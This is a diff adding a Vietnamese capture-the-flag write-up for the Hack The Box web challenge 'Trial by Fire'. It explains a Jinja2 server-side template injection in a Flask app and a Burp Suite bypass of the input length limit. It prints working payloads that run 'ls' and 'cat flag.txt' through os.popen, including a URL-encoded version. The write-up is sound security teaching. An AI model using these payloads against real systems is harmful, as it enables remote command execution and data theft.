@@ -107,6 +107,153 @@ Well, chúng ta sẽ injection bằng cách chèn `;` sau lệnh
 
 > Flag: HTB{Sh4d0w_3x3cut10n_1n_Th3_M00nb34m_T4v3rn_3781689d3c170ed98c97f7079a582d12}
 
+### Chall name: Trial by Fire
+>As you ascend the treacherous slopes of the Flame Peaks, the scorching heat and shifting volcanic terrain test your endurance with every step. Rivers of molten lava carve fiery paths through the mountains, illuminating the night with an eerie crimson glow. The air is thick with ash, and the distant rumble of the earth warns of the danger that lies ahead. At the heart of this infernal landscape, a colossal Fire Drake awaits—a guardian of flame and fury, determined to judge those who dare trespass. With eyes like embers and scales hardened by centuries of heat, the Fire Drake does not attack blindly. Instead, it weaves illusions of fear, manifesting your deepest doubts and past failures. To reach the Emberstone, the legendary artifact hidden beyond its lair, you must prove your resilience, defying both the drake’s scorching onslaught and the mental trials it conjures. Stand firm, outwit its trickery, and strike with precision—only those with unyielding courage and strategic mastery will endure the Trial by Fire and claim their place among the legends of Eldoria.
+
+Tree file đi kèm theo bài:
+```bash
+$ tree .
+.
+├── build-docker.sh
+├── challenge
+│   ├── application
+│   │   ├── app.py
+│   │   ├── blueprints
+│   │   │   └── routes.py
+│   │   ├── config.py
+│   │   ├── static
+│   │   │   ├── css
+│   │   │   │   ├── main.css
+│   │   │   │   └── style.css
+│   │   │   ├── images
+│   │   │   │   ├── dragon.jpg
+│   │   │   │   └── favicon.png
+│   │   │   ├── js
+│   │   │   │   ├── effects.js
+│   │   │   │   └── game.js
+│   │   │   └── music
+│   │   │       ├── battle-theme.mp3
+│   │   │       ├── capture.mp3
+│   │   │       ├── death.mp3
+│   │   │       ├── defeat.mp3
+│   │   │       ├── dragon.mp3
+│   │   │       ├── dragon-roar1.mp3
+│   │   │       ├── dragon-roar2.mp3
+│   │   │       ├── dragon-roar3.mp3
+│   │   │       ├── fireball.mp3
+│   │   │       ├── lightning.mp3
+│   │   │       ├── sword-slash.mp3
+│   │   │       └── victory.mp3
+│   │   └── templates
+│   │       ├── flamedrake.html
+│   │       ├── index.html
+│   │       └── intro.html
+│   ├── flag.txt
+│   ├── requirements.txt
+│   ├── uwsgi.ini
+│   └── wsgi.py
+├── config
+│   ├── nginx.conf
+│   └── supervisord.conf
+└── Dockerfile
+```
+
+Từ file họ cung cấp, mình sẽ khoanh vùng lại các file đáng nghi: `app.py`, `routes.py`
+
+Sau khi đọc thì mình thấy có vẻ file `routes.py` dính lỗ hổng SSTI
+
+```python
+@web.route('/battle-report', methods=['POST'])
+def battle_report():
+    warrior_name = session.get("warrior_name", "Unknown Warrior")
+    ...
+    REPORT_TEMPLATE = f"""
+    ...
+    <p class="nes-text is-primary warrior-name">{warrior_name}</p>
+    ...
+    """
+    return render_template_string(REPORT_TEMPLATE)
+```
+Lệnh trên có nghĩa là trong `REPORT_TEMPLATE`, `warrior_name` được chèn trực tiếp vào template và được render bằng `render_template_string`
+
+Và đầu vào không được lọc ở đây
+
+```python
+warrior_name = request.form.get('warrior_name', '').strip()
+session['warrior_name'] = warrior_name
+```
+
+Ở web khai thác HTB cũng đã gợi ý cho mình biết rằng số 49 có thể là gợi ý, mình xem qua file `index.html` thì đúng thật
+
+![trialbyfirehint1](/assets/images/HTB-Apocalypse/Web/web_trial_by_fire/trialbyfirehint1.png)
+
+Để khai thác SSTI thì mình cũng cần biết server dùng templates gì
+
+```
+Flask==3.1.0
+gunicorn==23.0.0
+supervisor==4.2.5
+Jinja2==3.1.5
+werkzeug==3.1.3
+MarkupSafe==3.0.2
+```
+
+Server dùng Jinja2, mình sẽ dùng payload {% raw %} `{{ 123 * 234 }}` {% endraw %} để thử, nếu kết quả ra `28782` thì ta có thể khai thác
+
+Bạn cũng có thể tìm các loại payload khác nhau ở [PayLoadOfAllTheThing](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
+
+Ok, vậy ta tiếp tục exploit SSTI
+
+![trialbyfirehint2](/assets/images/HTB-Apocalypse/Web/web_trial_by_fire/trialbyfirehint2.png)
+
+Vậy là ta có thể khai thác SSTI
+
+Mình sẽ dùng đến [BurpSuite](https://portswigger.net/burp) để bypass qua phần kiểm tra tối đa đầu vào chỉ có <= 30 ký tự vì
+
+```html
+<input type="text" id="warrior_name" name="warrior_name" class="nes-input" required placeholder="Enter your name..." maxlength="30" style="background-color: rgba(17, 24, 39, 0.95);">
+```
+
+Đầu tiên chúng ta sẽ thử gửi 1 payload xem thư mục hiện tại có `flag.txt` không
+{% raw %}
+```jinja
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+```
+{% endraw %}
+Mình sẽ hướng đẫn từng bước một:
+1. Đầu tiên chèn payload vào ô form (mặc kệ dù có bị mất chữ hay không)
+2. Bật `Intercept` của `BurpSuite`, rồi quay lại web ấn `Challenge the Fire Drake`
+
+Sau khi gửi form, bên `Intercept` của `BurpSuite` sẽ hiển thị
+
+![trialbyfirehint3](/assets/images/HTB-Apocalypse/Web/web_trial_by_fire/trialbyfirehint3.png)
+
+Có vẻ như server dùng URL encode, ta sẽ encode lại payload ĐẦY ĐỦ của mình
+{% raw %}
+```
+%7B%7Bconfig.__class__.__init__.__globals__%5B'os'%5D.popen('ls').read()%7D%7D
+```
+{% endraw %}
+
+Sau khi đổi payload ta sẽ được
+
+```html
+warrior_name=%7B%7Bconfig.__class__.__init__.__globals__%5B'os'%5D.popen('ls').read()%7D%7D
+```
+
+Ấn `Forward` và tắt `Intercept`
+
+Sau khi bạn chơi minigame đến khi có được battle-report
+
+![trialbyfirehint4](/assets/images/HTB-Apocalypse/Web/web_trial_by_fire/trialbyfirehint4.png)
+
+Chúc mừng bạn đã tìm được flag, giờ đã có thể gửi payload để xem nột dung của flag rồi đó
+{% raw %}
+```jinja
+{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}
+```
+{% endraw %}
+
 ## Forensics
 
 ### Chall name: Thorin’s Amulet
